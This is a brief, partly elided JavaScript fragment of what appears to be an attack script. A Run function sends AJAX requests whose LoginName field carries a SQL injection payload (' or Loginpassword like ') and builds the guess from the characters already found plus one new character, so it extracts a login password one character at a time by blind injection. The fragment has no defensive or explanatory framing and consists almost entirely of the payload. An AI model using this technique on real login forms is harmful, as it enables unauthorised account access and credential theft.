...
function Run(index) {
    ...
    CallAjax({
        ...
        data:  dataStr+"&LoginName=' or Loginpassword like '" + saveStr + currentChar + unknownStr+ "&LoginPassword=222&LoginForced=true&RememberLoginPassword=&Submit.x=84&Submit.y=4",
